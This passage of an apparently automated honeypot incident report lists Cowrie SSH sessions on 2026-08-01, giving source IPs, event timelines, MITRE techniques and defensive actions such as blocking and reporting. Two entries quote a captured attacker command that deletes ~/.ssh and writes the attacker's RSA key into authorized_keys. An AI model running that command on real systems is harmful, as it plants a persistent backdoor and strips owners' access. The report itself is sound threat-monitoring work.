| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 07:42:28` | `cowrie.session.connect` |
| `2026-08-01 07:42:28` | `cowrie.client.version` |
| `2026-08-01 07:42:30` | `cowrie.client.kex` |
| `2026-08-01 07:42:31` | `cowrie.login.success` |
| `2026-08-01 07:42:32` | `cowrie.session.params` |
| `2026-08-01 07:42:32` | `cowrie.command.input` |
| `2026-08-01 07:42:32` | `cowrie.command.failed` |
| `2026-08-01 07:42:33` | `cowrie.log.closed` |
| `2026-08-01 07:42:35` | `cowrie.session.params` |
| `2026-08-01 07:42:35` | `cowrie.command.input` |
| `2026-08-01 07:42:35` | `cowrie.session.file_download` |
| `2026-08-01 07:42:35` | `cowrie.log.closed` |
| `2026-08-01 07:42:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.190.64[.]245` to AbuseIPDB if not already reported
- [ ] Block `115.190.64[.]245` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e06a4b99816a

| Field | Detail |
|---|---|
| **Source IP** | `115.190.64[.]245` |
| **First Seen** | 2026-08-01 07:42 |
| **Last Seen** | 2026-08-01 07:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 07:42:35` | `cowrie.session.connect` |
| `2026-08-01 07:42:35` | `cowrie.client.version` |
| `2026-08-01 07:42:35` | `cowrie.client.kex` |
| `2026-08-01 07:42:37` | `cowrie.login.success` |
| `2026-08-01 07:42:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.190.64[.]245` to AbuseIPDB if not already reported
- [ ] Block `115.190.64[.]245` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79fd704227fb

| Field | Detail |
|---|---|
| **Source IP** | `115.190.64[.]245` |
| **First Seen** | 2026-08-01 07:42 |
| **Last Seen** | 2026-08-01 07:42 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 07:42:37` | `cowrie.session.connect` |
| `2026-08-01 07:42:37` | `cowrie.client.version` |
| `2026-08-01 07:42:37` | `cowrie.client.kex` |
| `2026-08-01 07:42:41` | `cowrie.login.success` |
| `2026-08-01 07:42:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.190.64[.]245` to AbuseIPDB if not already reported
- [ ] Block `115.190.64[.]245` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-735440c34960

| Field | Detail |
|---|---|
| **Source IP** | `81.214.75[.]248` |
| **First Seen** | 2026-08-01 07:51 |
| **Last Seen** | 2026-08-01 07:51 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 07:51:01` | `cowrie.session.connect` |
| `2026-08-01 07:51:01` | `cowrie.client.version` |
| `2026-08-01 07:51:01` | `cowrie.client.kex` |
| `2026-08-01 07:51:02` | `cowrie.login.success` |
| `2026-08-01 07:51:03` | `cowrie.direct-tcpip.request` |
| `2026-08-01 07:51:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.214.75[.]248` to AbuseIPDB if not already reported
- [ ] Block `81.214.75[.]248` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7531d5f4c28f

| Field | Detail |
|---|---|
| **Source IP** | `223.25.108[.]2` |
| **First Seen** | 2026-08-01 07:51 |
| **Last Seen** | 2026-08-01 07:51 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 07:51:09` | `cowrie.session.connect` |
| `2026-08-01 07:51:09` | `cowrie.client.version` |
| `2026-08-01 07:51:09` | `cowrie.client.kex` |
| `2026-08-01 07:51:11` | `cowrie.login.success` |
| `2026-08-01 07:51:12` | `cowrie.direct-tcpip.request` |
| `2026-08-01 07:51:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.25.108[.]2` to AbuseIPDB if not already reported
- [ ] Block `223.25.108[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88e91f6a1a75

| Field | Detail |
|---|---|
| **Source IP** | `85.152.57[.]60` |
| **First Seen** | 2026-08-01 07:58 |
| **Last Seen** | 2026-08-01 07:58 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 07:58:46` | `cowrie.session.connect` |
| `2026-08-01 07:58:47` | `cowrie.client.version` |
| `2026-08-01 07:58:47` | `cowrie.client.kex` |
| `2026-08-01 07:58:48` | `cowrie.login.success` |
| `2026-08-01 07:58:48` | `cowrie.direct-tcpip.request` |
| `2026-08-01 07:58:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.152.57[.]60` to AbuseIPDB if not already reported
- [ ] Block `85.152.57[.]60` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3cadb4b9933a

| Field | Detail |
|---|---|
| **Source IP** | `121.189.198[.]60` |
| **First Seen** | 2026-08-01 07:58 |
| **Last Seen** | 2026-08-01 07:59 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 07:58:57` | `cowrie.session.connect` |
| `2026-08-01 07:58:58` | `cowrie.client.version` |
| `2026-08-01 07:58:58` | `cowrie.client.kex` |
| `2026-08-01 07:59:00` | `cowrie.login.success` |
| `2026-08-01 07:59:01` | `cowrie.direct-tcpip.request` |
| `2026-08-01 07:59:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.189.198[.]60` to AbuseIPDB if not already reported
- [ ] Block `121.189.198[.]60` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85009e05c7e8

| Field | Detail |
|---|---|
| **Source IP** | `222.120.176[.]6` |
| **First Seen** | 2026-08-01 08:00 |
| **Last Seen** | 2026-08-01 08:00 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 08:00:34` | `cowrie.session.connect` |
| `2026-08-01 08:00:35` | `cowrie.client.version` |
| `2026-08-01 08:00:35` | `cowrie.client.kex` |
| `2026-08-01 08:00:37` | `cowrie.login.success` |
| `2026-08-01 08:00:38` | `cowrie.direct-tcpip.request` |
| `2026-08-01 08:00:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.120.176[.]6` to AbuseIPDB if not already reported
- [ ] Block `222.120.176[.]6` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd532a4fb71e

| Field | Detail |
|---|---|
| **Source IP** | `136.56.34[.]147` |
| **First Seen** | 2026-08-01 08:00 |
| **Last Seen** | 2026-08-01 08:00 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 08:00:49` | `cowrie.session.connect` |
| `2026-08-01 08:00:49` | `cowrie.client.version` |
| `2026-08-01 08:00:49` | `cowrie.client.kex` |
| `2026-08-01 08:00:50` | `cowrie.login.success` |
| `2026-08-01 08:00:50` | `cowrie.direct-tcpip.request` |
| `2026-08-01 08:00:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `136.56.34[.]147` to AbuseIPDB if not already reported
- [ ] Block `136.56.34[.]147` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33c8cd5a95d3

| Field | Detail |
|---|---|
| **Source IP** | `196.189.126[.]185` |
| **First Seen** | 2026-08-01 08:00 |
| **Last Seen** | 2026-08-01 08:01 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 08:00:53` | `cowrie.session.connect` |
| `2026-08-01 08:00:53` | `cowrie.client.version` |
| `2026-08-01 08:00:53` | `cowrie.client.kex` |
| `2026-08-01 08:00:55` | `cowrie.login.success` |
| `2026-08-01 08:00:55` | `cowrie.direct-tcpip.request` |
| `2026-08-01 08:01:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.126[.]185` to AbuseIPDB if not already reported
- [ ] Block `196.189.126[.]185` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4bec2cccc86

| Field | Detail |
|---|---|
| **Source IP** | `103.93.37[.]178` |
| **First Seen** | 2026-08-01 08:09 |
| **Last Seen** | 2026-08-01 08:09 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 08:09:33` | `cowrie.session.connect` |
| `2026-08-01 08:09:35` | `cowrie.client.version` |
| `2026-08-01 08:09:35` | `cowrie.client.kex` |
| `2026-08-01 08:09:38` | `cowrie.login.success` |
| `2026-08-01 08:09:39` | `cowrie.direct-tcpip.request` |
| `2026-08-01 08:09:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.93.37[.]178` to AbuseIPDB if not already reported
- [ ] Block `103.93.37[.]178` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-242ffc7b54c4

| Field | Detail |
|---|---|
| **Source IP** | `114.55.149[.]142` |
| **First Seen** | 2026-08-01 08:18 |
| **Last Seen** | 2026-08-01 08:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 08:18:59` | `cowrie.session.connect` |
| `2026-08-01 08:18:59` | `cowrie.client.version` |
| `2026-08-01 08:18:59` | `cowrie.client.kex` |
| `2026-08-01 08:19:00` | `cowrie.login.success` |
| `2026-08-01 08:19:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.55.149[.]142` to AbuseIPDB if not already reported
- [ ] Block `114.55.149[.]142` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6dd3de572f4

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-08-01 08:19 |
| **Last Seen** | 2026-08-01 08:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 08:19:01` | `cowrie.session.connect` |
| `2026-08-01 08:19:01` | `cowrie.client.version` |
| `2026-08-01 08:19:01` | `cowrie.client.kex` |
| `2026-08-01 08:19:01` | `cowrie.login.success` |
| `2026-08-01 08:19:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32f38833f13c

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-01 08:22 |
| **Last Seen** | 2026-08-01 08:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 08:22:16` | `cowrie.session.connect` |
| `2026-08-01 08:22:16` | `cowrie.client.version` |
| `2026-08-01 08:22:17` | `cowrie.client.kex` |
| `2026-08-01 08:22:17` | `cowrie.login.success` |
| `2026-08-01 08:22:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf0929029b3b

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-01 08:22 |
| **Last Seen** | 2026-08-01 08:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 08:22:16` | `cowrie.session.connect` |
| `2026-08-01 08:22:16` | `cowrie.client.version` |
| `2026-08-01 08:22:17` | `cowrie.client.kex` |
| `2026-08-01 08:22:17` | `cowrie.login.success` |
| `2026-08-01 08:22:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b46d335c1743

| Field | Detail |
|---|---|
| **Source IP** | `172.105.128[.]12` |
| **First Seen** | 2026-08-01 08:25 |
| **Last Seen** | 2026-08-01 08:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0[.]0 Safari/537.36, Accept: */*, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 08:25:12` | `cowrie.session.connect` |
| `2026-08-01 08:25:12` | `cowrie.login.success` |
| `2026-08-01 08:25:12` | `cowrie.session.params` |
| `2026-08-01 08:25:12` | `cowrie.command.input` |
| `2026-08-01 08:25:12` | `cowrie.command.input` |
| `2026-08-01 08:25:12` | `cowrie.command.failed` |
| `2026-08-01 08:25:12` | `cowrie.command.input` |
| `2026-08-01 08:25:12` | `cowrie.command.failed` |
| `2026-08-01 08:25:12` | `cowrie.command.input` |
| `2026-08-01 08:25:12` | `cowrie.log.closed` |
| `2026-08-01 08:25:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.105.128[.]12` to AbuseIPDB if not already reported
- [ ] Block `172.105.128[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cef7851b1d5c

| Field | Detail |
|---|---|
| **Source IP** | `111.70.22[.]154` |
| **First Seen** | 2026-08-01 08:26 |
| **Last Seen** | 2026-08-01 08:26 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 08:26:13` | `cowrie.session.connect` |
| `2026-08-01 08:26:14` | `cowrie.client.version` |
| `2026-08-01 08:26:14` | `cowrie.client.kex` |
| `2026-08-01 08:26:16` | `cowrie.login.success` |
| `2026-08-01 08:26:16` | `cowrie.direct-tcpip.request` |
| `2026-08-01 08:26:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.22[.]154` to AbuseIPDB if not already reported
- [ ] Block `111.70.22[.]154` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-493d6e6c2847

| Field | Detail |
|---|---|
| **Source IP** | `35.130.111[.]146` |
| **First Seen** | 2026-08-01 08:26 |
| **Last Seen** | 2026-08-01 08:31 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 08:26:23` | `cowrie.session.connect` |
| `2026-08-01 08:26:23` | `cowrie.client.version` |
| `2026-08-01 08:26:23` | `cowrie.client.kex` |
| `2026-08-01 08:26:25` | `cowrie.login.success` |
| `2026-08-01 08:26:25` | `cowrie.direct-tcpip.request` |
| `2026-08-01 08:31:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.130.111[.]146` to AbuseIPDB if not already reported
- [ ] Block `35.130.111[.]146` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70d09eb5fdc7

| Field | Detail |
|---|---|
| **Source IP** | `123.212.9[.]122` |
| **First Seen** | 2026-08-01 08:28 |
| **Last Seen** | 2026-08-01 08:28 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 08:28:33` | `cowrie.session.connect` |
| `2026-08-01 08:28:34` | `cowrie.client.version` |
| `2026-08-01 08:28:34` | `cowrie.client.kex` |
| `2026-08-01 08:28:36` | `cowrie.login.success` |
| `2026-08-01 08:28:37` | `cowrie.direct-tcpip.request` |
| `2026-08-01 08:28:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `123.212.9[.]122` to AbuseIPDB if not already reported
- [ ] Block `123.212.9[.]122` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59e5d0b7e632

| Field | Detail |
|---|---|
| **Source IP** | `109.233.21[.]109` |
| **First Seen** | 2026-08-01 08:28 |
| **Last Seen** | 2026-08-01 08:28 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 08:28:42` | `cowrie.session.connect` |
| `2026-08-01 08:28:43` | `cowrie.client.version` |
| `2026-08-01 08:28:43` | `cowrie.client.kex` |
| `2026-08-01 08:28:44` | `cowrie.login.success` |
| `2026-08-01 08:28:45` | `cowrie.direct-tcpip.request` |
| `2026-08-01 08:28:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.233.21[.]109` to AbuseIPDB if not already reported
- [ ] Block `109.233.21[.]109` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78387b05fbd7

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-01 08:36 |
| **Last Seen** | 2026-08-01 08:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 08:36:47` | `cowrie.session.connect` |
| `2026-08-01 08:36:47` | `cowrie.client.version` |
| `2026-08-01 08:36:47` | `cowrie.client.kex` |
| `2026-08-01 08:36:47` | `cowrie.login.success` |
| `2026-08-01 08:36:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3ff7188ba8a

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-01 08:36 |
| **Last Seen** | 2026-08-01 08:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 08:36:47` | `cowrie.session.connect` |
| `2026-08-01 08:36:47` | `cowrie.client.version` |
| `2026-08-01 08:36:47` | `cowrie.client.kex` |
| `2026-08-01 08:36:47` | `cowrie.login.success` |
| `2026-08-01 08:36:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da2b15524a74

| Field | Detail |
|---|---|
| **Source IP** | `134.209.116[.]251` |
| **First Seen** | 2026-08-01 08:43 |
| **Last Seen** | 2026-08-01 08:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 08:43:10` | `cowrie.session.connect` |
| `2026-08-01 08:43:10` | `cowrie.client.version` |
| `2026-08-01 08:43:10` | `cowrie.client.kex` |
| `2026-08-01 08:43:10` | `cowrie.login.success` |
| `2026-08-01 08:43:10` | `cowrie.session.params` |
| `2026-08-01 08:43:10` | `cowrie.command.input` |
| `2026-08-01 08:43:10` | `cowrie.command.failed` |
| `2026-08-01 08:43:10` | `cowrie.log.closed` |
| `2026-08-01 08:43:11` | `cowrie.session.params` |
| `2026-08-01 08:43:11` | `cowrie.command.input` |
| `2026-08-01 08:43:11` | `cowrie.session.file_download` |
| `2026-08-01 08:43:11` | `cowrie.log.closed` |
| `2026-08-01 08:43:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `134.209.116[.]251` to AbuseIPDB if not already reported
- [ ] Block `134.209.116[.]251` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1b2be38a340

| Field | Detail |
|---|---|
| **Source IP** | `134.209.116[.]251` |
| **First Seen** | 2026-08-01 08:43 |
| **Last Seen** | 2026-08-01 08:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 08:43:11` | `cowrie.session.connect` |
| `2026-08-01 08:43:11` | `cowrie.client.version` |
| `2026-08-01 08:43:11` | `cowrie.client.kex` |
| `2026-08-01 08:43:11` | `cowrie.login.success` |
| `2026-08-01 08:43:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `134.209.116[.]251` to AbuseIPDB if not already reported
- [ ] Block `134.209.116[.]251` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34e2b8b55bb3

| Field | Detail |
|---|---|
| **Source IP** | `134.209.116[.]251` |
| **First Seen** | 2026-08-01 08:43 |
| **Last Seen** | 2026-08-01 08:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 08:43:11` | `cowrie.session.connect` |
| `2026-08-01 08:43:11` | `cowrie.client.version` |
| `2026-08-01 08:43:11` | `cowrie.client.kex` |
| `2026-08-01 08:43:11` | `cowrie.login.success` |
| `2026-08-01 08:43:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `134.209.116[.]251` to AbuseIPDB if not already reported
- [ ] Block `134.209.116[.]251` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8e47a965561

| Field | Detail |
|---|---|
| **Source IP** | `65.20.204[.]41` |
| **First Seen** | 2026-08-01 08:44 |
| **Last Seen** | 2026-08-01 08:44 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
